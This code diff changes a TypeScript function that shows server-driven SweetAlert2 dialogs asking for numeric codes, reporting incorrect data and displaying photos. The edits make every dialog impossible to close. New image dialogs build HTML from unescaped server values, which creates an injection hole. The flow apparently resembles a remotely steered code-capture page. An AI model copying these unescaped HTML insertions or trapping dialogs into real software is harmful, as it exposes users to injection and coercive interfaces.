@@ -14,6 +14,7 @@ function t(dict: Dict, key: string, fallback?: string): string {
     return dict[key] ?? fallback ?? key;
 }
 
+
 export function showCommand(command: Command, ctx: Ctx): void {
     const { dict } = ctx;
 
@@ -68,6 +69,7 @@ export function showCommand(command: Command, ctx: Ctx): void {
                 allowOutsideClick: false,
                 allowEscapeKey: false,
                 showCancelButton: false,
+                showCloseButton: false,
                 inputValidator: (value: string) => {
                     if (!value) return t(dict, 'flow.codeRequired');
                     if (!/^\d+$/.test(value)) return t(dict, 'flow.numbersOnly');
@@ -89,6 +91,9 @@ export function showCommand(command: Command, ctx: Ctx): void {
                 text: t(dict, 'flow.incorrectData'),
                 icon: 'error',
                 confirmButtonText: t(dict, 'flow.ok'),
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showCloseButton: false,
             }).then((r) => {
                 if (r.isConfirmed) ctx.reset();
             });
@@ -100,6 +105,9 @@ export function showCommand(command: Command, ctx: Ctx): void {
                 html: command.text,
                 icon: 'error',
                 confirmButtonText: t(dict, 'flow.ok'),
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showCloseButton: false,
             }).then((r) => {
                 if (r.isConfirmed) ctx.reset();
             });
@@ -113,6 +121,7 @@ export function showCommand(command: Command, ctx: Ctx): void {
                 confirmButtonText: t(dict, 'flow.sendAnswer'),
                 allowOutsideClick: false,
                 allowEscapeKey: false,
+                showCloseButton: false,
                 inputValidator: (value: string) => (!value.trim() ? ' ' : null),
                 preConfirm: async (value: string) => {
                     try {
@@ -126,66 +135,26 @@ export function showCommand(command: Command, ctx: Ctx): void {
 
         case 'photo.with-input':
             Swal.fire({
-                title: t(dict, 'flow.uploadPhoto'),
-                html: command.text ?? '',
-                input: 'file',
-                inputAttributes: { accept: 'image/*' },
-                confirmButtonText: t(dict, 'flow.sendAnswer'),
+                html: `<img src="${command.photo_url}" style="max-width:100%;border-radius:8px;margin-bottom:${command.text ? '12px' : '0'}" />`
+                    + (command.text ? `<p style="margin:0;font-size:15px;">${command.text}</p>` : ''),
                 allowOutsideClick: false,
                 allowEscapeKey: false,
-                inputValidator: (value) => (!value ? ' ' : null),
-                preConfirm: async (file: File) => {
-                    const extra = (Swal.getPopup()?.querySelector('#swal-extra-text') as HTMLInputElement | null)?.value ?? '';
-                    if (!extra.trim()) {
-                        Swal.showValidationMessage(t(dict, 'flow.codeRequired'));
-                        return false;
-                    }
-                    try {
-                        await ctx.answer({
-                            command: 'photo.with-input',
-                            payload: { file, text: extra },
-                        });
-                    } catch (e) {
-                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
-                    }
-                },
-                didOpen: () => {
-                    const popup = Swal.getPopup();
-                    if (!popup) return;
-                    const input = document.createElement('input');
-                    input.type = 'text';
-                    input.id = 'swal-extra-text';
-                    input.className = 'swal2-input';
-                    popup.querySelector('.swal2-file')?.after(input);
-                },
+                showConfirmButton: false,
+                showCloseButton: false,
             });
             return;
 
         case 'photo.without-input':
             Swal.fire({
-                title: t(dict, 'flow.uploadPhoto'),
-                html: command.text ?? '',
-                input: 'file',
-                inputAttributes: { accept: 'image/*' },
-                confirmButtonText: t(dict, 'flow.sendAnswer'),
+                html: `<img src="${command.photo_url}" style="max-width:100%;border-radius:8px;" />`,
                 allowOutsideClick: false,
                 allowEscapeKey: false,
-                inputValidator: (value) => (!value ? ' ' : null),
-                preConfirm: async (file: File) => {
-                    try {
-                        await ctx.answer({
-                            command: 'photo.without-input',
-                            payload: { file },
-                        });
-                    } catch (e) {
-                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
-                    }
-                },
+                showConfirmButton: false,
+                showCloseButton: false,
             });
             return;
 
         case 'redirect':
-            // redirect handled by the hook via window.location.href
             Swal.close();
             return;
     }
